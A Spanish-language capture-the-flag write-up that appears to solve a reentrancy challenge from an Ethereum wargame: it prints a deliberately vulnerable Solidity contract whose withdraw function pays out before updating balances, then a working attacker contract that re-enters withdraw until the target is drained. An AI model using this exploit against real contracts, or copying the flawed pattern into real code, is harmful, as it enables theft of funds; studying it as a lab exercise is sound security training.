# 10-Re-entrancy

## Objetivo
El objetivo de este reto es robar todos los fondos del contrato

## Contrato
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
## Análisis del contrato
* Importa las librerías de SafeMath de OpenZeppelin y las aplica en los uint256
* Posee el mapping balances que es público, y asocia un address a un uint
* La función donate(), es pública y acepta eth. Recibe como parámetro un address. Agrega el valor enviado en la transacción al mapping de balances correspondiente
al address enviado por parámetro.
* La función balanceOf(), es pública y view. Recibe por parámetro un address y retorna un entero. Devuelve el valor que tiene en el mapping de balances, el address
enviado por parámetro.
* La función withdraw(), es pública y recibe por parámetro un entero. Valida si el valor que se está enviando en la transacción es mayor o igual al valor que el sender
posee en el mapping de balances. Si esto sucede, realiza un **_call_** enviándole como valor, el parámetro recibido. Si se realizó correctamente resta el valor al balance
del mapping.
* Por último posee una función para recibir ether.

## Solución
Para resolver este caso, tenemos que realizar una llamada a la función withdraw antes de que se realice el ajuste de balances (aquí está el fallo).
Para esto, vamos a crear el siguiente contrato:
```Solidity
contract hackReentrancy{
    
    address public reAddress = ADDRESS DE TU CONTRATO REENTRANCE;
    
    Reentrance public reentrance;

    constructor() payable{
        reentrance = Reentrance(payable(reAddress));
    }
    
    function donate(address reciever) public payable{
        reentrance.donate{value:0.001 ether}(reciever);
    }

    function withdraw() public{
        reentrance.withdraw(0.001 ether);
    }

    receive () external payable{
        if(address(reentrance).balance >= 0.001 ether){
            reentrance.withdraw(0.001 ether);
        }
    }
}
```
* Posee la función donate() que llama a la función donate del contrato original.
* Posee la función withdraw() que llama a la función withdraw del contrato original.
* Posee una función para recibir ether. En esta función validamos, que el balance del contrato original sea mayor o igual a la cantidad que estamos retirando. 
Si es así, llamamos nuevamente a la función withdraw del contrato original.

Entonces, primero debemos realizar una donación al contrato original con el address de nuestro contrato malicioso para que se cargue en el mapping de balances.
Luego debemos llamar a la función withdraw de nuestro contrato. Cuando recibamos el eth, se volverá a llamar
a la función withdraw del contrato original y así sucesivamente hasta que se haya quedado sin fondos.

Una vez realizado esto, validamos que efectivamente se haya quedado sin fondos, eviamos la instancia y listo! Reto completado.
